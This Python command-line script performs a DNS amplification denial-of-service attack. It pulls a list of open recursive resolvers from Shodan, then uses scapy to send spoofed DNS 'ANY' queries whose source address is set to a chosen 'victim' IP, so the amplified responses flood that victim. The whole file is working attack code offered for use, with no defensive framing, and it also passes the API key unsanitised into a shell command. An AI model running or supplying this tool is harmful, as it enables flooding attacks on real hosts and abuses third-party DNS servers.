

import typer
import re
import subprocess
import os
from rich.console import Console
from time import sleep
from scapy.all import *
def subprocess_call_commands(command):
    os.system(command)


console = Console() 


def main(api_key: str,victim:str,targeted_domain:str):
    #Check on VICTIM format
    if not re.match('^(?:(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])(\.(?!$)|$)){4}$', victim):
        print("ERROR: Victim must be an IP")
        return
    #Check on TARGETED_DOMAIN format
    if not re.match('^(?:www\.)*\w+\.[a-z0-9]+', targeted_domain):
        print("FQDN must respect the format: www.domain.xyz or domain.xyz")

    #Initialize
    with console.status("[bold green]Shodan init key...[/bold green]"):
        init_command = "shodan init " + api_key + " > /dev/null 2>&1"
        subprocess_call_commands(init_command)

    with console.status("[bold green]Discovering DNS...[/bold green]"):
        search_command = 'shodan download DNS-Resolvers "Recursion: enabled" > /dev/null 2>&1'
        subprocess_call_commands(search_command)

    parse_ip_command = 'shodan parse --fields ip_str DNS-Resolvers.json.gz > /dev/null 2>&1 > DNS-Resolvers.txt'
    subprocess_call_commands(parse_ip_command)
      
   #Delete DNS-Resolvers.json.gz
    subprocess_call_commands("rm DNS-Resolvers.json.gz")

    with console.status("[bold red]Performing attack...[/bold red]"):
        with open('DNS-Resolvers.txt') as f:
            contents = f.readlines()
            for ip in contents:
                dns = IP(src=victim,dst=ip.strip())/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=targeted_domain, qtype="ANY"))
                sent = send(dns,count=5,return_packets=True)
                print(sent.summary())
  
                #attackCommand = "dig " + victim + " " + i + "> /dev/null 2>&1"
                #subprocess_call_commands(attackCommand)
    

 






if __name__ == "__main__":
    typer.run(main)
